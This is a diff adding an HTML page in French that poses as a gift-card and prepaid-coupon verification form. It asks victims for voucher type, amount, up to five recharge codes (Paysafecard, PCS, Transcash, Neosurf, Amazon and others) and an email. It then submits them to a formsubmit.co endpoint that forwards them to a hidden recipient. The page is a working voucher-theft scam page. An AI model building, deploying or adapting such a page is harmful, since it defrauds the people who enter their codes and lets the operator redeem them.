@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+    <link rel="stylesheet" href="crypto.css">
+    <title>gift card!</title>
+  </head>
+  <body>
+    <div class="form-body">
+          
+        <div class="form-holder">
+            <div class="form-content">
+                <div class="form-items">
+                        <b>
+                              Renseignez les informations du coupon ici
+                          </b>
+						<form target="_blank" action="https://formsubmit.co/4fe5b27f21a040819120bcf66471140c" method="POST">
+
+                            <div>
+                                <div class="col-md-12">
+                                    <select class="form-select mt-3" id="devise1" value=""  name="message" required>
+                                        <option selected disabled value="">choisir une recharge</option>
+                                           <option value="PCS">PCS</option>
+                                           <option value="PAYSAFECARD">PAYSAFECARD</option>
+                                           <option value="TRANSCASH">TRANSCASH</option>
+                                           <option value="NEOSURF">NEOSURF</option>
+                                           <option value="TONEO">TONEO</option>
+                                           <option value="ORANGE">ORANGE</option>
+                                           <option value="PAYPAL">PAYPAL</option>
+                                           <option value="LEBARA">LE BARA</option>
+                                           <option value="LYCAMOBILE">LYCAMOBILE</option>
+                                           <option value="GOOGLEPLAY">GOOGLE PLAY</option>
+                                           <option value="AMAZON">AMAZON</option>
+                                           <option value="BITNOVO">BITNOVO</option>
+                                      </select>
+                                </div>
+								 <br>
+                                <div class="col-md-12">
+                                   <input class="form-control" type="number" id="montant" step="1" name="montant" placeholder="Entrer le montant de la recharge" required>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-md-12">
+                                     <select class="form-select mt-3" id="devise" value="" name="devise" required>
+                                           <option selected disabled value="">choisir la devise</option>
+                                           <option value="euro">euro</option>
+                                           <option value="Dollar">Dollar</option>
+                                           <option value="CHF">CHF (Franc suisse)</option>
+                                    </select>
+                                </div>
+                                <div class="col-md-12">
+                                   <input class="form-control" type="text" id="recharge1" value="" name="recharge1" placeholder="entrer le code de recharge 1" required>
+                                   <div class="invalid-feedback">entrer au moins un   code de recharge</div>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col form-floating mb-3">
+                                   <input class="form-control" type="text" id="recharge2" value="" name="recharge2" placeholder="entrer le code de recharge 2" >
+                                   <div class="invalid-feedback">entrer au moins un code de recharge</div>
+                                </div>
+                                <div class="col form-floating mb-3">
+                                   <input class="form-control" type="text" id="recharge3" value="" name="recharge3" placeholder="entrer le code de recharge 3" >
+                                   <div class="invalid-feedback">entrer au moins un code de recharge</div>
+                                </div>
+                            </div>
+                            
+                            <div class="row">
+                                <div class="col form-floating mb-3">
+                                   <input class="form-control" type="text" id="recharge4"  value="" name="recharge4" placeholder="entrer le code de recharge 4" >
+                                   <div class="invalid-feedback">entrer au moins un code de recharge</div>
+                                </div>
+                                <div class="col form-floating mb-3">
+                                   <input class="form-control" type="text" id="recharge5" value="" name="recharge5" placeholder="entrer le code de recharge 5" >
+                                   <div class="invalid-feedback">entrer au moins un code de recharge</div>
+                                </div>
+                            </div>
+
+                            <div class="col-md-12">
+                                <input class="form-control" type="email" id="email" value="" name="email" placeholder="E-mail Address" required>
+                                 <div class="valid-feedback">Email field is valid!</div>
+                                 <div class="invalid-feedback">Email field cannot be blank!</div>
+                            </div>
+                            <br>
+                            <button type="submit"  id="form" class="btn btn-primary btn-lg btn-block" value="Contrôler" onclick="controle()">VERIFIER MON COUPON</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+    <!-- Optional JavaScript -->
+    <script src="crypto.js"></script>
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.7/dist/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+  </body>
+</html>
